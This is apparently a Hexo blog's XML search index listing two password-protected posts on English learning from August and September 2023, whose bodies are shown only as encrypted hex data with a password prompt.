<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>English learning September 2023</title>
      <link href="/2223/09/01/Englishlearning-September2023/"/>
      <url>/2223/09/01/Englishlearning-September2023/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d04bc87d63c00042de885069a4562ccd01bb16496684ff87e046ba8f021cf647">9437a95e56b24d5da67ff8d3ebbb0d56afa721ffb68934a5c51890a2a491300addc1c07f9352f965e18709e276363b200ba72d7ff4bc756ae66312e1abb7b85fd71f94344554a0f0ad8bbf46f720af8aff70cd56d1d869fdbbe7f516978635a8dddf06dca80cf7c83440a4c106b5354a350a6b0be1e8c45e423b9531cbbadfabf4b2635e5b859c6dc4a9b3259736c007330c8b80a8d8c37d5706fcb683a85669680b258b9cb11a2e0131ccd8926ba76da59615a9d5b81ba8f5b1aa0ffe794ec7cf96a572037c31ff1be5719ab4631a492a7d60af6fe635e8d903d122c1ca642704877785c3ba58c80eaf5e1e35b84766d834eb5b96f8855f7b1e27664c92b813956f0510c444abba10ac19648a44b796a2e2f3e8b0980b2a56cdfe6b91f920497846b0f1a8a3e099b6d8276f26da278c771ac0d993b1e9d8d83af81ad3c34faf45e038fa8187c06dfd47d8eecddbc92ce9232a6ef56b66cdde86a53b4b3d7e52f4b9d2bf7093b59a9cfdbc9cdd8297f39e8e95251bb51fa3e22c78d1f1b4c67e776f2e77b1f50feabf3bd65b9bf5b268cbcc51cdaf6db4a4c1354b28c5d3b177898c2e4f1c7c2cdfe266aefcb8fa5117ebf0e991b42f7fb5a482563e92121087c06ea23f9b599205ff4a2604aca45f23cff3b83015e56375b31ff837a7cf99a5020203c8579b7e0440b122e8a3fa33027f053c36d9ccd594d82725530d2aad9cab4b75b4a1dd086764e6dad87e8792f8f2f84f7108b8d7fe9ea53d551e1f6c9bc53f85be8b676cc975a0e598f3de57a6872e01771ffece5b9745749669eb730be865151f467a12c48e53a5a6f818f81047f2f9817bc723a747518fd1c9528644783536d6767716562197d6901001409bf1197d96d7eb410e9d437c8f34d6dc9c4224fa29af05e86ed7974768b2a2fc55eeb2ffdc0871849e692b99ed54411d3cb35ec17de3fbf180f50a949126e0b75918be751e8cfa76dd21510ac7b4a25550cf3461fa80bc41af5d9dfd8b63827aec760d1dd52ca1bdbed6d7054faf35a717c68769ad553edf513ac68f5c7e65d9f78f3c469f3b20bd9772474f487af6d06c451c29af26c3718514ab69e44ca37daa063f46ff0b9631db43addb9be168bff8121f625168967a08bf99a93d119d1a9af445ee43c73d453d1170604f616c91792f0ce778a1f3f178a0b8fca503fdf2d363ca03b81f56211dae8fcf39d9d45899b7efbaeed46f1e453de0157e123ce47773c6cfffad3202abaa52462f8b5ca2d206d5bbce6fc0f848ccfbfd2131a2d9c82d3cff514eb5808e605717ecfc483bed42c20a34a364432875627421d22d397fb04a85ef62492f3efd38e8983b31cfee75c76a3385225253a1c0c2f88f21f35753d6d381f1eb154d5d8682339b75f6c314fba017b71edf1826193a2833bc8064ad68ac667b8545a0051bc5ba9d3ef72d4954904b3374d4ce584eae38bc998f80fb3f2ff6687d293cb644828eeb53c8616012dfc52a53bb2e76f45d9b091b6eda73219ec2d7650b3349e259d5a3d1bbd5de9eacb68feab1089fbdb80500d1406a5c19acca1325c9d23a9006ab696ffba8d31f29a1053db8e89f516421ee9e39f6f559bf66ab786b781f2bd18bfe845bfb1a5ff213843fd61e8ff871a3ace68ffb7c5d6437ba5e44e365c03916e501775ab17811f8ceaca64efe54c821ecfc2446e441b5fb8680ea3b4012feaf6525d394383c57790fd3d084881f91f678c65ae52803cc18a8310a6d142261420a7f7536e4f93e87bd63e9a7d1b0368a402b54db7d4a3fc0e362340cf4ddad8c1b3926d4134e575537ac5f9297f3974cc10913e8ad7c3cddbd1be7ab535b25637fb7f181e5cf83d195a13fe90fe69654869e51a63779b16be895b55b24c232b2e620113b997f8f461376f864d6e7586eba49bd20b63d24db4276e041892ef080f66c460b386a907a4821fbb52992ae5c28a9a8c0fd74bd99588314d7914cee7c2caa4171ff7afabdec3027d1b743b22b2b81bb0b847832d755516fd6837bd32e9f8bb716cefe0e3ed32e876a98dd447b11197cff24146731fda56bbf2185d19ef10b93d1b11d76c8a032e0c6dbb023979c1c993e494757271da07ef59f75a00aadea83a47470a2755f5d84e65942d3b5456ad5a867588fe642df1b4264127bda30c6f44e97937f8766f2c47be28111e252d029e18ac8e859ad38d179f1fcdca299b322c5055719cb24a7fc1e704e55409e83a6a57f14e9b48d1b023d9137b4dc67cb643a2b69c34cb682076d7a30014b2bdb911a6e77e905bdfdae9a3fc4ea09ce4f96a6a3b52081866feeb20fe1fc71d2836c0b37e896dc7afedd69c94cb943e563a970111c1b520d758f1fa9d9945c0898a30b053a7d297ff9e59b9fc35d50e0b935210e38b4f5da68b8615f1e816767523a9cb96033f4818c927a28e522e931c8b1b9fc91bd136748eafceb288c699eec7e36992c66b6535c2d5c49126bc7e724dfa4a0d7adcca4bde7afa1ad4f4d58d2ba99649e6530ab7865c0395b64f32c4e9a0cf7309f1a7357562c3c8bcc9c731173a1d443845c522ebbddd3dd34b6e3ca7d0726637b310811fcc0165287e7f2c8423c99a607fcac28471fad6e8eee2b79dc535bdbacc6b370c5401b9797dc92c6d50dbf2400b9d0a7fbf306d76782b6570fd394cc4abcbf78e46e99eb561263577258f119d83025d2377498254b68202c02214b22d1c6cfe29d910984d1a034c57ed2b0aa740a06fa796522345b116a18404f3c94d6ffb6561e961ab87edccf259a6d351849906e100bdb4f4df2e10c6bca5534d4d799154b6d910f449f1c678578f8d14ae9a05eb7d7121b04e09151e70d19c6e818f1fa5932d0aa0d8c2395a79c291cbb711617c867e65b026fe77d5956c109e8a1acd4ff647e9aaca1ccc4239fbb8932208886c00390b04e24749133ed31562b7a04d9ca79cec0dcdd32ef86583c0076b9335569b1c47726818f40f9041fad913a31df779c0a454c497f0a39a533851e7f601b39d840ed6b3985cdd7ee78f3dc694b09c5b51908661f8dd0565be7ea2903b1c00dcb7ebd24e8c2ee11acb682b27b0fd7a6aa138a5b1cb1394d8b3ab69860b57123923059c0f5edc965ecbc62ae6ec4d93b9473281f5983ac0d5aa5d36adb27bb5452c54cd53ca1d9c0c647e77eab45508823a3e16b330da7ece89b4421409b94a2bc5c48c98537ae100fc480233db5fcaa17185ea2f03fa4cdb8e0de0d61df629f875df7ff3028c4027efd8bef4035ce6635e9366bbdcfdb21cd6ccb0571b158ca12b68f581b0ef3310bb1cf139ff605e3271d34816737a35fef7d116d6a9db80644dbaf0fb98c48517643e89dc1f5654ab27ac714e62612e22d8fc561b142fb08e4cb7e808fa0b7f8a93559825d779a9a4ab27735a6216f52ff448673b01659cc3a1a6b4f7f0c94cf33a496a475ef5b31b446779ae8c279b143ac0ba32cc6d5e4e15d96b83f345a1a41a2e5dc5c02fe46e3f7ee03a73b16b83c445602ffa62ea85dfae504d50ee67a1a24b40bb0fb5bee03abb1c73b7d2407fe8dfa29d2961d30de3137b5eb69e8c1a6516c13da4f51b22aff6560f3a4f260508fb1fbabea3ec312dc041c8d64aac904c615d43014dd76bd98ac1fcdcc4794fcf7edea43072b5bbfbf00758d7fbc73a6758e70e90f96c8f17ea87a1afe08810447000f0ef3b5873c6d9b48701c5f9eca6ebee46e72c6e5e5bd97cb814a6fefba0e7fb3402e047dd2ac66b0a05e1b419edc72aaa419d29817ccf664b9e2d2c6d16ce02b14834845f1fc2bcf2d9bb2ac3773eeb6542cc94415879c9269b482fae6dbbf6af24fa4eb7d217ab35ac86feed5699dcd7a6c5780beb88f1183e055758f14c3738ce1dc2069b2fe37cb1a324a0614893148dacb3052fee3135674e8c09818571ca7538cb2872b3b09cc9c3725447993d24f93d4035d8ab6634923ea8343caa271b52dba93ea11185e294acff8e7acc1cc1e90ce46576014db736aae2dbbdf9715736df2fdba7d9fd2b5280b4076b83e508ffab739b1ec347f71f930b580e83f11a31f8217c9b01e369dbe59746e15fe761ae0b8013befc5eb439d415c764b557615bfea9121604a7f2923cc61d7fc78ef5b6e1ea738f0d6729b4aaa415d298c097f59c6d05c335752d203bcd5abf07e6d253afc85a985768a0a12fdac25dd58aeeda40a44c67c688575f764f9a5b6a8fc2fcaa00d2c0ef72dc55753c32d5191c732b3f61e6587ce5b7051fe065e29c2cb35b2fcc0eb541e5cf2b6e1ab8258991b111afa1e7ddaebad9e85056fce49ac22ab12696b803b860ed90940009841a499ecc20b097892a9e8b165d13c1fa35d31ac7a01bd86120dbcb4fe6750f21a51c5c6505b2dd05ccc975d2028843226ca86e45fbe6f32622253ff8c2ef2bd177eac6cde86344a0af3be2ac3d6fd4ad62af0be9cb96a0a431717e655bf9e596cceff35e0fc8e7b4e70252e33d7e43f7a9424976f34a509fb3f2372aeadb5bcdeedbe1e9ac45060d4aba795071835baf82348e362eb2f023796053994dc5e39cfd8a95f5c851eb5fd3539e2ef97d8e0a150d7adf8d4bff2898dae6a697029a3521b1c90efdca149722e94ece3f01aeaa5f9195860984def5fef4f735b18443608a012ef93af19ad6ac4bdbfa5abb8f8c19d054f8c62a7dfdea4b1151fafcae7fe70e4f68ef91d41fc20672c08d2c2703b7c0b3ef85fe49e5be2e6e310ba303df8f92def50ba8fe46a98f941c443c3d9ce155a0cdadef47061e942318b0cfedcf980e9bf25783dbbda1b9472d20f67026bece8cd53208a0bff592e23463b9f5de49b3e0bd93140f8c8f6903bd24ff1fc8b5a4e2e2a4a42e021858de9e03b26604b9d2f098c96ec5fd133be12dffcbaf883903cf8853f89a49e2ab0c520301e5d5de33da47cdda39d66ee6afd38dcd8a1e925d0408c9b7d97e63ae93356062ffc9d3ab4ff240f2c75df6d7066505a86c4d1de05c6b0b6ad8b7c3850b5e3c62646979ab2fdb779c04072719cc492accede7b70e066965b336cf2de99b000909830521abbc255e38055b0bbde0f95491ca111</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>English learning August 2023</title>
      <link href="/2223/08/01/Englishlearning-August2023/"/>
      <url>/2223/08/01/Englishlearning-August2023/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fcddbe25f9f586eaa81c8f63818f90e59d7be6462699ee14d3a3ec3dd110163e">9437a95e56b24d5da67ff8d3ebbb0d56afa721ffb68934a5c51890a2a491300addc1c07f9352f965e18709e276363b200ba72d7ff4bc756ae66312e1abb7b85fd71f94344554a0f0ad8bbf46f720af8aff70cd56d1d869fdbbe7f516978635a8448d514dcb497089e7486cc932fa38b940adc509c159e72018716bf5fc4e10927a5e4916b2ba3fcf3ad6e40d5150ea1932fd218c00834100069c88eca02c02d3a3873a4527b0484f797001695a66418e8d8c9280a36fd2d6dc8208d3eaa99cba9aaeed456b0c7a70ffbe644480728aa8e9732ef2eb70d03315fd52b41f00050a5297b38de58e6c20985ae01f3caa80cd6c25dd4ca8e5d74cdee22d67f45aeb77766053c3af7ab89b072e2371792e1e09e05f4b235da1faf0761aa32d03a8f675f77f15f309c647bcac0cd83f871e8c2b979b2d22d65a2013ade0aee7478e24d0a35ef363f3c69efd18f9f1bb530d72a03d1141efcddfd9bfb2b7d48a4ee0b6424bb03c40c898c9baf60432cf8d1fa597c0e3320e49a36f8c37d31ee1ddbae74a1ff74aa8f4ea33cd8766666a0e656fe40c68279217170893b4815004318c98345c52e883f20a50882a613961421a211334fbcecc1b004bcc46bc84018bcc4774e67bd915446d87e1a0fc2ce13c3dcc645ebb92cdead0c3524299cee9e010a85d6996f72595fb9e4e659c466a8c2f6057a558d716383ac021c2d569c6376b3bfc35006cba8476af5c76bc7e9da3555f0b27feb0ee2f06912be08cfbc3f64713484f6e2e52f090771403711811aa48c4c3d17092b3778c5c66b4a3a846ebe04a77b38df2dd4aa11f3779a06c6283c5518a2019ebb292e46a73f9b770b79b9050a4c89c111a49a93a88731a5917b0d47cbcf8b48e29236020d0283f2e8b787d93fd9e591e79be5300a63003c519af15abda4dcfd858743d2fdeb8aee30386903d77c1bb0b90966057250d76d3a9ed852d646c888e2a77d27328eb0b35d83bac4e380cc7920fe0ed4a832f20839aad1469efbfc58500614c77c61971be90a158224fe514f9b32d9d03c8bce8852a462a606484a292af4c63b7567a2c185af8442cb1cecd61f1aa93c908eb0fef1f554a3630f322b84974086c188b09d777a7f65bc66025e05d686d877cfbb2bf3b1033f31cf69bcb49b383d02df213687efe027bb12a3f7c3d4ee5e9a3ca10c88ed3852a6acc2049b1bdbdac01143982d50d235750b0560db4b67d06fa6b65fc019b6c58cc2cdd1afe05369e0da92609697e2ef424bda0bb694c55b09f717a0f2a9d530f5228ceed9dfa8a63cfb142494437503acaabda5f24639277de5358f5d60c96adee516b3ad2e858456b115d87e22df5671b7afb054b28fd4d2f7a8d84905b0572ffe0ee5e699bc3d834c69333e451b09084511d3cf2eacc046d1969c9f3206e90de241a4cda9d4306788d4d95533e0d12273d46693f11200bead33e26e58d7c5ebc6e097f91102e978ec7ca5e0c6a4746efbbd9955cebc79a4cb2c886a9074d5720de2922e1977ace371bd12898c2ebb9af788a284db6a24661928fcde8229f376747778bb1784b1f3555a6efae124840ebea837b964dedd5df44344899262d70f5930d01716f69accd3bf3486356493335f77bd4dc214345f07bd788fa4ec97da9cafeb8c1808f20cffb259d463bfb41438169d8f106f462413fad7b49ff676de9d039380ed4dcbe9035995dc3ae060c551cd02bc1cb2b9f83d371162886e9e5978e272f5a35a79522452278ca53603f7711f95b7566f9f3057f1fb86876f30eb39034942524f9b49da60624fe36e2b7d9bb5d261cff974fd1d9f3723a7055318393b196c2b5664022b91e5bc8146905d28ad74382aa5b23b387445374e4b6cd8604d8e017ea329dad86e14816bf84d4020c2d6d648ae488e856b9fbc39158f8d8919a5bcca52b21fb6ef348c77bd03c9a23af7501a225d83950d55ffe31ec8aef944a61d8a298290bbe4d650f3f10387c3591eb4af24d36bacdb11c34b145cf5e5a363ef00002769e32a327cfc45aea14ea38ca4a1b1572c7a4324bc5200f5fb26f95ab1aa954d69fbff1d9f1cf17877c400fa73dda3a0cf3aa8d9c60ae702b861d2f476f65b6b8b33f94425923d2c03c97a236fb8c9e5e3e43d91e312158894a55cd3ca3785d7faa7f6c4d7afeabd644f8358c168a8121cc8652a8a4dc8063e033574445e0b9bbd42ff276fe2c5231f0877bc2050454385662663c172c71d369fd00bdc070d45284f56d0533f60782fbc89525033400b8595e52b6bb54b2db2c12d633e8c9d05bfa16513c7b8799be9b458946ddf14870b82f94eb8e5bba3b35d5566ee3ae65f3212c3c9e06bc10261ed781c1c6356827d9ad7457291925514788e48114eeb23e97f00372ce999a1f44683386110ee7f98ff5dda4a60e246beac22efc8a1e398e97b2cf686874991383b8078ee321bc2e013454110014549e269e6be3f13ba9da872fc16a3755e79ffccb0e4d507c5a0d61ce146e16a1dc790db61701ba7318fa40e0247dbad1875154352f6f328d5270eb520e67c762b2a006a088de57416c2518beaf7678dc3a8082a1fbb0692e2f95163ee8181e4b8232c0d7557e8d405248854c2f53843c09a0ae172bd2f0be46b7c8cfa60f90b8e514bd874f84a57cf451d1ff80839052128d9d8784a12e429e1c7d6b8243d36a060f626dfb659981f7b74c8a72b344fed012a1e7a2ec996502bbc199f3c17d403bce110de2dc39a358c9fabfffefed8427dd4e2d59e10e2b176253f2eb7fd2daac0439de83763ced0e506e0a33caa733d3da723e1a8f5be05b926a3f1d880b20a8cfc647db18aff2fa9e2c9374ce4d06639c453906c49df1c774054a226e312cfa6443c1794e786c53f9a44b06107a3a5f5b1c1cda0a30156f4ec41b0edde61a1fa3b773631a9ef2e054157bc79354d2ab2f709497b08cabf9a2e8318ee27e635a94228ea891f107419561dae3a2ae1b6fe9cb7dd2be85dd91060dc29db15e6e27ce65196d3a0e3b03a017d89b2b6718d8737e46acd587096234be02aa26643ef01388178e4368054300d60ab4e2e4e9701686a44435a0fad3f50eea667018420ac0c133cf05437a7846b750d79c6d066ee4720193d945cfb5236c6ba052af9f4d8a6141d8de06657a2f3f67da5922927c7e2f2ef98915be964cf5d3052b0de41c959b919140d7c5c82bd24027c616ad1001af398ff8832268c9d9de51eee5e9cef775dc03690b47e0ac25ac5fca8d1340ada6276a00a0a544966d7d14b5f6361d3a4311d08939b46a7024f333d1a287efce61a1e0819a2868b47429ab4427461cc77ca6fb1a4bdbde2608c3a045a983c74fa50ab44a97bb5cd698b98b17f061fd61165ef4f4769221b78213afcae3f318e418e90d72ebeca53b661aff04c167ab68ddde458b28c6ff22541f4ce2eae9899b4a0f23d9f23aa2369f00877c9b9c1dbd2e2a34c8508a6b1d9ea468398a3d3f1eb06ea7f97e3b5c312ad48dfd36a863d6d4b5acba653949622c0f483d79eb10d5c9c8eeef7efbfc4735b53c4d1eda4ef4f82c77943388a24fcfeffd692e95c8bcc87dee3af7673861b8d48b1fd38a975d09d148568b587ae9383fe282ee3cc76371b91dd986bbffa176246b5112554a7fbd82906975f0bc6c75bca3c1a096079312b2ee48347f91cbddeae5819adf1fcaa57dd5fe6cdd3a5af10ab315a658d8007757271ea6f49c0d4352ddacaecca6011586ed9fb434275283064a81014b07696039e321fc49b8a03dcb2d8e4624880aa4863a62c64bb7af9a6b2afcab61271f3b6a883eab182bfdefd00e5b14701dd8d2daca9b314a265868a35800bf02e4bb1926e07faebaf62f600b6e3458f38d4f020ca608501684925c82d594c251a7b7b64cd5de08a93b53146f21bb57d1c9cb830278d50247cf75434e5a4a7192e51278a1d5f23b2c0e86562b5304b2344c3bf0b3e1ae68ae32a140e17f0bb536f0069f13f166fbcc3df27eeeab74a2887fa51d5d283f654fc9bb801482f613d52617876e787f7ba13e8ab21502cce91747d936cf59df0e87320c0c06acfd21f4e401dc80f0c663eb2ab0bca3f74e8912e7ba81e5b65d121a38a4b4a52a864c086a1da8ac64ef31719b415d9c52ebd96eb0acd8d0c575861bf40ab104737205d0ed7acd5b4f2f031cb8fa0313874bf150c4b3fcea792179c767f551aa8026a6ec6c8660e1ce9f2cfc2cf69b8c80ceafb2d3d84de479e97fd0c4c8fc2d19f5cedcc7f93a396ef32b5a0d70b2dfec7aad2ede90a4f717f8861f86adb250e2d73c14ee9099b4acf9fde2c4f33d0f4bc1fd3fb2496cabe4766512019ca38ac3db0cebfe7f5090ec73d52d6c0e830dff0543a0366a1984104a7a21c7abeb2fd84ff2e7d2d6e1d93c82c45713a37599ada7e5234a2f46811e2be1cb49332bb28839aab29dbada2d1d086f7f142871f31087ba91a265883442654815c2fc015bc26b9a24378a2b0bb8a74b578aecd7432069a0027a4a3684da82880a48c968be4bedeb36eb30ab371bbec64bcb3527085051a3bfa2fdc52b8a9ae6bc41db57da76a2b41569906cfbaf53e4b49d837885dd615070213021622b703cc54d63b8749a9ba8be0f4d0cc2d0ec6bff3d11724baad75b1d458b1586a7e183766c0193e7faaae539183835bf1d1bc5d51bec60a2045c2a58392ee18bacb6dbebc1451c7182e234e0744c0fa53e2d484d90cac28eb7979002dbd0f537e6d220092389c579f70b1ec88a42bbbf84daed5a7ba53c7a544cc80a501c4524c787ba86ed88b45ecb9398a331b1c896e561f31f9008bc5b43098960d66a8488c1a06470476701df8c0a314c58c37d2a352277bcecd3baf5eab51ca859312b806eb25f5519cfaf484144896ffa1cf1958a2f8d31c81017759c38ee3b864c4db2be34b814c3a6c4a2a18f9c3d515c7d7c4dac17069a6120d0eac005523e389c79990a811308ec700c78821586a297494f61ae3adb2020b3756aa85128ee9a4902d62467dc795493a32f3829da800f0dd935b82d68e94d76bd7cf3c137940f4cc2a4c77c92af4d6c5fbbe7d5fe198f8b153f2a68822a26dd9aebfaafb0663fa84c699c323342fd22f2277d0361f0f8727f701db0903dbe3ee24ea2ba6dfb3a7d8cd8b8a9539c42f6d2c20f4cfb39def681c696fda35335ff4e0d900fe1af23c3cc25fb65f9bfec14208f871e22a9f493bb3a7e059ce2ba9d911a5ffa2f25076312944b59acf25dade601e74c69ea25453ce1ff9ada34fb29b857469c9a4b69918719b66b1179b66e78ada387c8481fe9c373f06e032ca83e2a1de9061803701d21c56294f31c8d689f7b68d2a8f30a51eb6775c57788bf1e18fc330af60b2d9ee658f34a2a4a3f1b1ddb91287374c942a83674f8a6e1ece950c51ba5b8a473ba364f3a360229c1e3aa85ed8170e0485ac934f29ef0251723ba1e0ca2c52957dabf7aea4cd6d5095c11ddee63967d5ac2ee34975d9737ba2167f7f2012a03a4d3e83392de9b1b3710d9a37512a4a64fd57f58e0e057fda02bf9c1efc8e924ce78fdf5d71bc7ca956609525798fd45d9a8cae2c669a352e5f264ab38795a28d8c1cf9f9ee94dc4e4824d58c8c918dd0df01bf5d47a49668248c02a885d17f8e0d64934dc6dbe87fdf1c6716148fe645e6dfd27d71324b50ba5ac21a474b9b2b99c60b84af7022ac2c9a4c66ea20d3637aab86a2a4f52e4cf594589e071aa36e06b10dad5033d233db2c8b75821dd7298e54ab84e3f6a0308fd479643f001cb6c14808afe7ff23330b956d28846d7ce5b0c71c1e943a2bad0ac6990b24e61594577fdbff6132bb703d37016476208792a9cc6260caa386d874559fc0998f9559335269e8fca3d4e852b21c197ae7aebcf9597081e9e8808a8bd344095547d2c8dd43422ae5040f38f7550a327cd099d95e2249ec5bc7e8f01fb36fa2c6936374b2224fe14e9dc35a6b9f62b5cf02884326def73d3e08a5f26275c10530eb15ccc6116a7b01597d1ec81c248ab562095493684f762c3242b38109a9ca5b98dd1a9b47eb80ab1da4f9565d8a8aa7dc72620632eadedb637ce911a9574d0d15606728433cec2e416f24dee1fadec8f77b8437c8ffde02708a9097273cbf42eb73c7fb871ed720b1766152d97720cf45cae417f6a2823970c73c3ddff654a39925ee0474e2bc05362d8b6cedd7a4396619b4125931527af45387539ead953b119905841b9f02e471dd93e5233fad2d1af544f8efab51616b41a91bc6f6dc9cabfc406f675f066b3bd131ff34b079213fd01df25a364d26c806c73bc22464d5fd21e0340141702d24bddec7678518a5bf660016f0d0d10e7ddcfcb75db917e278862a7cbbe76884502db805ec81da3d17ad45ca8e41fa94640e65475fdf3cbc216b1f9e7204143b9a84141d76c94d7b60f5b996e37145f1e9cab5f09bbf40b7ee3f2aa22aed0b3c18fa766628c9675090f0ccb54f1b736626c48edade8a08201cd78692fac6402f729327cffea0d51a729ab5c4891758dc96750f58531d9211a0693c5644fe3f4fbe30547e0663f82e676688fecfb635371419e85ec52a0e4d363b87a5c3e06948a7773f9bbc6c729467c30405c4544077b593fe921a34a774b21af05875b26642807981ad63b4d74c7818f0ca1ec29f412f7d03b38836b83e924c847581827fd48080ba9203205ad821decb1c87b837be3a89f7c4dd63fa9bdc78a75b9842c055d3e0b8381771c687b11d4445c8bc8e374e444b70569274b7bb0bf07532eea532e699236bb910695c2627380459eb6f6ab3ee1b9f01d8a848950aacf97cb08ea8e6e13c067135ddc5c3ec032196466dd1a095f5ce210ab8cbee645b4b2a6f29e6df69f84440613b4dca5f1ca0f34d8ba7d40adaac05c0762c5aaa83160ad973dc3c8df6743fb2d9090524d13012a1683b2a64a1e0092b43984a83c4c94b6dafdd1bce4778c7ffe3d17163c456eea013539b137434a640fbfde38bbed9abadc2e8494e1eba7360dc3e77019ff0cfe706a95931c5bbe1470469bc98a9d9e5d0688081569f39dbabca44d01da935de1ea2fea15d000bcf6c43e764fac9aa5bddb9272fafb78998184eb4986810ab8fb91adc759350271cc9266729947ff1b1c7cc11a577919db605cc70ced9dfade7693f739e0de08828b2f32bd03ae1a7f3cb9101594f6846b955c35b13c0059148cd957d0d8bc5df1b6f3d63a60571b86d983d0fad7cbadd6c5169ba769ea6c9dd5041ee7aa48f31d3e8b3c3ff91a2be260dc626a497095bf58d6f5d6514d60f838ec2a0841fb259a79c2174a8f4af3010bd23fbf2fb11910a43e7b6a04eae63d726d8d75af31e0063cc6914f64d7c0538739539859575a56f94abac7f28d2e1884fe2e9a927b7850046dfcc303a07345fd7a3b1425cfc9c1aad919743f0cbb986e603577e64307efcbc1a96442d7789dc9521b1af06c42ad62d367e213e0cff7bd7f1d64d70f100cdbb3739186f768abc6f38f1ecfb864c5c5de2808d0cf5bf17be285ca492d22b96ce59a129b2b8966573b56ef69d8a4a945415ecca3e2f4379ebaf05095fca6f676502427d4d3aaa8b14bc37606b489800d5c9c5a364e65d4d1596f5d21565a99ab0b0cde81d57bb0fff34cec745b1a34a756fb864712429165057203a1305fbc650245fc269a9fc29607c96ebcd7c6688234a4fcd41bf9916da292c3d940d08f05def1b672bb0f25c9ff62f626a17b35ac79c734fdb0c39be1af082b1cff848ddfef14d689efe9b33f22e316049d5b5ee354638e3b2413ee133cefca788e09760d22435e897549380e7b03ad0ca4d98b297646bc7231af7fba2e2437887facc77e351aa0868dd08f5bc146ff71d92fedefca6d19c5f56a1c32f429b9936dd0441e62c9fc218e6074d417edd98e23799c558333d99516cb60318a0f1e069fead9af683721d543a6cb9d4401a5e9536429c62f9644e8e60e84141f4a866285ff2c6ab79e65ba091a15cec59864e3a5be9e730490a473279b46e2a59bc56426bc9823948b4b4a5efa6936ced99cad2d0edba16bc076d7bd2e477e27ae00146bf1850d5449299025b24b026682a4b435352423085741e310dbc0f7bd05e7c0b1e05953af97973e6768840cb3666f413c84cda806cba0747ec885dcbf18ee14cd1951ecbd3fc1c5e26ad65da932353d84f2a9e3bd02cac85751060af38011cc6b7e52959a470cebccb4176283b3a4400c465496369da7a2a2e997156c274c5bcfad33bb2be1e0d36c4dc6bda2f32e6b4388567347fe966fd6fac01a345eab68dc125153d546d7f09e8bb8ac64b46fc0fe8c1fa7e816752aabd9ccf16e36e15fa3c752264aefbfffef4e933b04b7ff92aaabb87808ed7d235ec623776150e699c6cd98742bb2b3d0249a709c89fc778745be42a212d885f281b75b9339926f0233ab8d710aa48a25a305b7a73d0698d7ba34fc302be530238d421b5ec782c9f420c1482f02db179b983b8c32942d50912f2820b0f5b419f43dacc0c2f6e8aeb75476bd8d70da5bd1298c45812a22747452ce4a8ccb96708c3860d7d64c1786babedc2b7da67b711ccafffbd7762c0d3b3ef3611a418a2d08bef85c2709bbd3d7610c7526c19c2fdfb5e776ae21c586b264b41287fbb213f2bb912e51c48b2dcb3eb3b9539a864035be509e62fa5c7737458ad86376924a50835357c15d779f44c2121cde278ad3d1e35028ef2a7f4312397abd5e5d85d60d695ba08f8338a71a4972d741e86deb274f940e19c9cea17fd5ea0f19f753368e1bfb1477b895a8a554c4b82e04fcbb8252dc1005408ea3dd96d28a2e1a3151c46c6b6c85ca4a9bb1a80bff6fffbcdc1552f77f6d5121fd8a7922987023fee1c36ee9e95cd8e6ebb314468991c434423fbc755fa21fe562145bca2d76cebb8663e622e21c4d4f27c628557de9bbcf9a9cc741f31cfd6e08f5d96ee825fae723140d8a390a38d07b8e9be6c69447955ada81f656f5318ba35b68cf1e0332b51ee3f6a61f0258f5d2480b7c85adcd5d99b3559ba325edc69eeb53bda187300c14916aa93a30a75b005c95c13afb41766cf6e6bbffb84b70a71cbb9502297ce170c28f07b868b5e4c578cb711ad6326bc6e215c62650d4d8b0458459d2f1e994d243d16d2a6cdbfed2bd2320c26917009595cf9dae10856d0462c754274ac0b783dbffeedf83cbcaab971080edf24d4f33fc0b67beb5d6bca7ae3d59d2510afce1dd6ef05d9f054ec28c602440aa0af2cb2d282881072bc00b8f03c2e71e670fb4b2ef3e0153f9d9dc9afc67af3f187aabac1e95de5cf58ea9a4919a6511acb822dde9b960af8fc4c1ab9e1957aa238d78e01e3e89e5314d2acd502d9e915ff86101a0e37e2c5e54b32213cfd7e546a9eba3f354d5c3b1785fd55091881bdaa63794b118572df0a07f4bb46fbf9d6a7e1ecc265b60be51b798c0f64d336dcfbf3f5371920939075a4d40ed9d38c65d98990c4427ac65b0ea1bd18f9ebafe1d67c03dabc82a7a90b420e9fda514e6ecfe17204e9da74b5eac9edac8a5c6d9cf7d5f7026327c6b5a7175e9e988f704bde46141d55db4fd8868062e99dfcff2664c20bdb54612d8753c6f8428b7802f4d350b1156f31fba3f592dd107c8db337871f29ed49085b7f1457a21e779a23e1113bd063b52a2bb828ed8d6dc420586ff2ddd7e54f1082d094de82bcddc2d9fd272791bc360a51f1923345b98419de8d86adcfe3452fb02e4623016ad10cb41833d2f7ce3319493bdd3a6b407ab998e61654e5819d97edf9d5e147424e646aee47f49fe59d385500f50b568af36af3daed20ecb8a0bddd64fa9fb075d5a6417c4c8d20246e6adca2892b256471dd96fc1a9cb9f7b490e08ceef26138083aebb3e05a326a6c5a4c50a9e2e45ad4a6c803940ad7917627ea72bdac5e05f39f7c8146d95892b66bd7da5204cd03c55d8a2eb1dc9f222ae78778caa30b0d7e074edee12106f11534826d9e43d57f98780e39d7b2c26b729c16923864e5ce523f4d38e40e4cd249de4c6ff1fe518af06de9a69c50c45ab201ad7765f322effd880db3f30a00fdf1be042a163764fa3d31da01e5f39a361d330c7cc608412bbaf37c3e40b4d98409eecebecb6f2e53e2a02283bb5a736689c08d03759d6d0b40f24796cd59792d32721a1d49ddde13d841c1216baedadc6e63c1cae48f945ac6b3186400f28fb02432cf928e5d6816af4eb86fcad49009af81529d90c471fe6a61aaed8e498d52552cfc108c358f08f711c52f39aea81730c6258bdcf9fb688e75732917039536318417cf96c2ec71a